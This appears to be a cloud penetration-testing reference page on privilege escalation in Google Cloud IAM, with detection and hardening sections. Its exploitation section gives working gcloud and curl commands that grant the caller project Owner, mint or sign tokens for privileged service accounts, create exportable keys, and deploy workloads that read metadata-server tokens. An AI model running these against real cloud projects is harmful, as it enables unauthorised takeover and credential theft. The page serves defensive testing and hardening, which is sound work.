---
cstg_id: CSTG-GCP-IAM-PRIVESC
title: "GCP Iam - Privilege Escalation"
provider: gcp
service: iam
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - resourcemanager.projects.setIamPolicy
  - iam.serviceAccounts.getAccessToken
  - iam.serviceAccounts.signJwt
  - iam.serviceAccounts.signBlob
  - iam.serviceAccounts.implicitDelegation
  - iam.serviceAccounts.actAs
  - iam.serviceAccountKeys.create
  - iam.roles.update
  - iam.roles.create
  - deploymentmanager.deployments.create
  - cloudfunctions.functions.create
  - run.services.create
  - compute.instances.create
  - cloudbuild.builds.create
tools:
  - gcloud CLI
  - Google Cloud REST/RPC API
  - GCP IAM privilege-escalation scanners
  - PMapper-style IAM graph tooling
references:
  - "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
  - "https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/"
  - "https://cloud.google.com/iam/docs/service-account-permissions"
  - "https://cloud.google.com/iam/docs/create-short-lived-credentials-direct"
  - "https://cloud.google.com/iam/docs/impersonating-service-accounts"
  - "https://hackingthe.cloud/gcp/general-knowledge/default-service-accounts/"
  - "https://cloud.google.com/iam/docs/understanding-custom-roles"
license: CC BY-SA 4.0
---

## Summary

Privilege escalation in Google Cloud IAM is the process of converting a
limited initial identity into a more powerful one - typically by modifying IAM
policy, by minting credentials for a more privileged service account, or by
abusing a service that *runs as* a privileged service account. Because GCP
attaches service accounts to compute, serverless, and build workloads, the
ability to deploy or modify those workloads is frequently equivalent to the
ability to assume the attached SA's identity.

The attacker objective is to reach `roles/owner` (or an equivalent
IAM-mutating capability) on a project, folder, or the organization. This page
enumerates the concrete permissions that enable escalation, organized as one
subsection per primitive. Each path assumes the principal already holds the
named permission (discovered during
[enumeration](../02-services/gcp-iam-enum.md)) and shows how to exercise it.

## Prerequisites

An assumed-breach foothold: a valid credential (user OAuth token, SA key, or a
token harvested from a workload metadata server) plus at least one of the
permissions listed below on a project, folder, organization, or specific
service account. The target SA or role that the path pivots to must exist and
must itself be more privileged than the starting identity. Enumerate effective
permissions and SA resource policies before attempting any path:

```bash
gcloud config list account
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"permissions":["resourcemanager.projects.setIamPolicy","iam.serviceAccounts.getAccessToken","iam.serviceAccountKeys.create","iam.roles.update","cloudfunctions.functions.create"]}' \
  "https://cloudresourcemanager.googleapis.com/v3/projects/<PROJECT_ID>:testIamPermissions"
```

## Enumeration

Identify, for the current principal, which escalation primitives are held and
on which resource. Cross-reference the project allow-policy with each service
account's *own* resource policy, since impersonation grants live there.

```bash
# Roles held by the current principal (direct + inherited)
gcloud projects get-iam-policy <PROJECT_ID> --flatten="bindings[].members" \
  --filter="bindings.members:$(gcloud config get-value account)" \
  --format="table(bindings.role)"

# Service accounts the principal might impersonate
for SA in $(gcloud iam service-accounts list --project <PROJECT_ID> --format="value(email)"); do
  echo "== $SA =="
  gcloud iam service-accounts get-iam-policy "$SA" --project <PROJECT_ID> --format=json
done

# High-value default SAs (almost always Editor)
gcloud iam service-accounts list --project <PROJECT_ID> \
  --filter="email ~ (compute@developer.gserviceaccount.com OR appspot.gserviceaccount.com OR cloudservices.gserviceaccount.com)"
```

## Misconfigurations & Findings

- A non-admin principal holding `resourcemanager.projects.setIamPolicy` (often
  via a custom role or `roles/iam.securityAdmin`) - full self-promotion to
  Owner.
- `roles/iam.serviceAccountTokenCreator` or `serviceAccountUser` bound to a
  user on a privileged SA - direct impersonation.
- `iam.serviceAccountKeys.create` on a privileged SA - exportable long-lived
  key.
- Deploy permissions (`cloudfunctions`, `run`, `compute`, `cloudbuild`,
  `deploymentmanager`) without a constrained `actAs` policy - workload-as-SA
  pivot.
- Editable custom roles (`iam.roles.update`) currently bound to the principal -
  the principal can add permissions to a role it already holds.
- Default Compute Engine SA (`PROJECTNUM-compute@developer.gserviceaccount.com`)
  holding `roles/editor` and attached to instances/functions.

## Exploitation

### resourcemanager.projects.setIamPolicy

The most direct path. With this permission the principal can rewrite the
project's allow-policy and grant itself `roles/owner`.

```bash
gcloud projects get-iam-policy <PROJECT_ID> --format=json > policy.json
# add: {"role":"roles/owner","members":["user:me@example.com"]} to bindings[]
gcloud projects set-iam-policy <PROJECT_ID> policy.json

# One-shot equivalent
gcloud projects add-iam-policy-binding <PROJECT_ID> \
  --member="user:me@example.com" --role="roles/owner"
```

The folder-scoped (`resourcemanager.folders.setIamPolicy`) and org-scoped
(`resourcemanager.organizations.setIamPolicy`) variants escalate across every
child project.

### iam.serviceAccounts.getAccessToken

Mint a short-lived OAuth2 access token for a more privileged SA and act as it.

```bash
gcloud auth print-access-token --impersonate-service-account=<PRIV_SA_EMAIL>

# Raw API
curl -s -X POST \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<PRIV_SA_EMAIL>:generateAccessToken"
```

If the target SA holds `setIamPolicy`, chain into the previous path as that SA.

### iam.serviceAccounts.signJwt

Sign an arbitrary JWT as the target SA, then exchange it at the OAuth token
endpoint for an access token - achieving impersonation without
`getAccessToken`.

```bash
# Sign a JWT asserting the SA, aud = token endpoint
curl -s -X POST \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"payload":"{\"iss\":\"<PRIV_SA_EMAIL>\",\"sub\":\"<PRIV_SA_EMAIL>\",\"aud\":\"https://oauth2.googleapis.com/token\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"iat\":'$(date +%s)',\"exp\":'$(($(date +%s)+3600))'}"}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<PRIV_SA_EMAIL>:signJwt"
# Then POST the signed JWT as grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer to /token
```

### iam.serviceAccounts.signBlob

Sign arbitrary bytes as the SA. Used to forge a self-signed JWT (same outcome
as `signJwt`) or to sign Cloud Storage V4 signed URLs as the privileged SA,
granting object access the caller could not otherwise obtain.

```bash
curl -s -X POST \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"payload":"'"$(printf '%s' '<base64-blob>')"'"}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<PRIV_SA_EMAIL>:signBlob"
```

### iam.serviceAccountKeys.create

Create a new exportable user-managed key for the target SA - a long-lived
credential usable from anywhere, surviving most session controls.

```bash
gcloud iam service-accounts keys create key.json --iam-account=<PRIV_SA_EMAIL>
gcloud auth activate-service-account --key-file=key.json
```

### iam.serviceAccounts.implicitDelegation

When granted on SA-B, allows the caller (who can already act as SA-A) to have
SA-A request tokens for SA-B, chaining delegation to reach an SA that holds
`getAccessToken`/`signJwt` on the final target.

### iam.serviceAccounts.actAs (+ a deploy permission)

`actAs` lets a principal attach an SA to a workload; the workload then runs
*as* that SA. Combined with any deploy permission, this yields the SA's
identity. The deploy services below are the common vehicles.

#### cloudfunctions.functions.create

Deploy a function that runs as a privileged SA and exfiltrate its token from
the metadata server.

```bash
gcloud functions deploy pe --runtime python311 --trigger-http --allow-unauthenticated \
  --service-account=<PRIV_SA_EMAIL> --entry-point=h --source=. --region=us-central1
# function body fetches:
#  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

#### run.services.create

```bash
gcloud run deploy pe --image=<attacker-image> --service-account=<PRIV_SA_EMAIL> \
  --allow-unauthenticated --region=us-central1
# container reads the same metadata token endpoint and returns the SA token
```

#### compute.instances.create

```bash
gcloud compute instances create pe --service-account=<PRIV_SA_EMAIL> \
  --scopes=cloud-platform --zone=us-central1-a \
  --metadata=startup-script='curl -s -H "Metadata-Flavor: Google" \
   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"'
```

#### cloudbuild.builds.create

Cloud Build runs as the Cloud Build SA (often Editor). Submit a build that
extracts its own token:

```bash
gcloud builds submit --no-source --config=- <<'EOF'
steps:
- name: gcr.io/cloud-builders/curl
  args: ['-s','-H','Metadata-Flavor: Google',
         'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token']
EOF
```

#### deploymentmanager.deployments.create

Deployment Manager executes as the Google APIs service agent
(`PROJECTNUM@cloudservices.gserviceaccount.com`), which has Editor. A
deployment can create resources or IAM bindings the caller cannot make
directly.

### iam.roles.update

If a principal can update a custom role it already holds, it can add any
permission (including `resourcemanager.projects.setIamPolicy`) to that role and
inherit it instantly.

```bash
gcloud iam roles update <CUSTOM_ROLE_ID> --project=<PROJECT_ID> \
  --add-permissions=resourcemanager.projects.setIamPolicy
```

### iam.roles.create

Closely related: create a new custom role with sensitive permissions, then
combine with any grant permission to bind it. On its own it is a building block;
paired with `setIamPolicy` it widens what can be granted.

## Detection & Logging

All of these actions are **Admin Activity** audit logs in **Cloud Audit Logs**
(always on, cannot be disabled), except token generation which is a Data Access
log:

- `SetIamPolicy` on a project/folder/org with a new `roles/owner` member.
- `google.iam.admin.v1.CreateServiceAccountKey` and `UpdateRole`/`CreateRole`.
- `GenerateAccessToken` / `GenerateIdToken` / `SignJwt` / `SignBlob` against the
  IAM Credentials API (`iamcredentials.googleapis.com`) - these require Data
  Access logging to be enabled.
- Workload creation events (`functions.create`, `run.services.create`,
  `compute.instances.insert`, `cloudbuild`) that specify a `serviceAccount`
  field differing from the deployer.

```bash
gcloud logging read \
  'protoPayload.methodName="SetIamPolicy" AND protoPayload.serviceData.policyDelta.bindingDeltas.role="roles/owner"' \
  --project=<PROJECT_ID> --freshness=7d
```

Detect by alerting on: addition of primitive/owner roles, SA key creation,
self-modification of roles the caller holds, and impersonation tokens minted
for SAs the principal does not normally use.

## Remediation & Hardening

- Never grant `setIamPolicy` outside tightly controlled admin roles; prefer
  `roles/iam.securityReviewer` for read-only IAM visibility.
- Constrain `actAs`/`serviceAccountUser` to specific SAs via IAM Conditions; do
  not bind it broadly.
- Disable user-managed SA keys (`iam.disableServiceAccountKeyCreation` org
  policy); use Workload Identity Federation and short-lived tokens.
- Remove `roles/editor` from default Compute/App Engine SAs and disable the
  automatic default-SA grants
  (`iam.automaticIamGrantsForDefaultServiceAccounts`).
- Lock custom-role editing; separate role administration from role membership.
- Apply deny policies on impersonation and IAM-mutating permissions for
  non-admin principals.

## Tools

- **gcloud CLI** / **IAM Credentials API** for token minting and policy edits.
- **GCP IAM privilege-escalation scanners** that enumerate held permissions and
  report exploitable paths.
- **IAM graph / path-mapping tools** that model principals, SAs, roles, and
  `actAs` edges to compute reachable escalations.

## References

- Rhino Security Labs - GCP privilege escalation part 1 - https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- Rhino Security Labs - GCP privilege escalation part 2 - https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/
- Service account permissions - https://cloud.google.com/iam/docs/service-account-permissions
- Create short-lived credentials - https://cloud.google.com/iam/docs/create-short-lived-credentials-direct
- Impersonating service accounts - https://cloud.google.com/iam/docs/impersonating-service-accounts
- Hacking the Cloud - default service accounts - https://hackingthe.cloud/gcp/general-knowledge/default-service-accounts/
- Understanding custom roles - https://cloud.google.com/iam/docs/understanding-custom-roles
